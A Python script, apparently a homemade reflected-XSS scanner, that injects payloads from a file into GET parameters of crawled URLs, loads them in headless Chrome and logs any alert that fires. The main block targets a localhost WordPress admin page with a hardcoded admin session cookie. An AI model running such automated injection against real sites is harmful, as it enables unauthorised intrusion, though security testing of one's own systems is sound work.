import csv

# 링크 파싱
from urllib.parse import urlparse, urlunparse, parse_qs
# 크롤링
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.alert import Alert
import time
# html 파싱
from bs4 import BeautifulSoup

from urllib import parse

options = webdriver.ChromeOptions()
options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36")
options.add_argument('headless') # 화면 안 보이게
driver = webdriver.Chrome(service= Service(ChromeDriverManager().install()), options=options)

def split(word):
    return word.split(', ')

def read_csv(target):
    data_array = []
    name = urlparse(target).netloc.replace('.', '') + urlparse(target).path.replace('.', '')
    name = name.replace('/', '')

    file_path = './data/' + name + '.csv'
    idx = -1
    with open(file_path, 'r', newline='') as csvfile:
        csvreader = csv.reader(csvfile)
        for row in csvreader:
            if idx == -1:  
                idx += 1              
                continue            
            data_array.append([row[0], [], []])
            data_array[idx][1].extend(split(row[1]))
            data_array[idx][2].extend(split(row[2]))
            idx +=1

    return data_array

def save(logs, target):
    name = urlparse(target).netloc.replace('.', '') + urlparse(target).path.replace('.', '')
    name = name.replace('/', '')

    with open(f'./log/{name}.csv', 'w', newline='') as file:
        fieldnames = ['삽입 코드', 'url', 'post_method', '실행된 알림']
        writer = csv.DictWriter(file, fieldnames=fieldnames)
        writer.writeheader()

        for log in logs:
            post_method = ', '.join(post for post in log[2] )            
            writer.writerow({'삽입 코드':log[0],'url': log[1], 'post_method': post_method, '실행된 알림': log[3]})

def read_payload(attack_type):
    payload = []

    file_path = "./payload/" + attack_type + ".txt"
    with open(file_path, 'r') as file:
        line = file.readline()
        
        while line:
            payload.append(line.strip())
            line = file.readline()   

    return payload

def crawling(url, cookie):    
    driver.get(url)
    if cookie != None:
        driver.add_cookie(cookie)
    time.sleep(1)          

def make_payload(params, pl):    
    query_params = [f"{param}={parse.quote(pl)}" for param in params]   
    query = "?" + "&".join(query_params) 
    return query

def attack(data, pl, num, cookie):    
    pl = pl.replace('{mes}', str(num)).strip() # 페이로드 완성 
    get_payload = make_payload(data[1], pl)

    result = [f'alert({num})', data[0] + get_payload, []]

    url = data[0] + get_payload # 공격 url 생성
    try:
        crawling(url, cookie)
    except:
        print(f"error with {url}")
        result.append('')        
        return result

    try:
        alert = Alert(driver)
        alert_txt = alert.text
        if ord('0') <= ord(alert_txt) and ord(alert_txt) <= ord(str(num)):            
            print("Vulnerability Found :", url)            
            result.append(alert_txt)     
        while True:
            try:
                alert.dismiss()
            except:
                break
    except:        
        result.append('')

    return result

def worker_GET(target, attack_type, cookie=None):
    log = []
    num = 0

    target_data = read_csv(target) # 크롤링한 데이터 읽어오기
    payload = read_payload(attack_type) # 페이로드 읽어 오기
    for data in target_data:
        if data[1][0] == '': continue        
        for pl in payload:
            result = attack(data, pl, num, cookie) # 페이로드 삽입해보기                   
            log.append(result) # 결과 로그에 저장    
        num += 1    

    save(log, target)


if __name__ == '__main__':

    attack_url = 'http://localhost:8888/wordpress/wp-admin/'

    worker_GET(attack_url, 'xss', cookie={'name':'wordpress_2b7738476b2cfaf3b5454b1e89821e63', 'value':'admin%7C1690215673%7CbJVrN3eiIePDZeuN7xonvgZxFyZvecjlwOHDYTKGfPW%7C6adf7da0108302300439c6d4254b040289c493fc4ea96c185517e264524a4569'})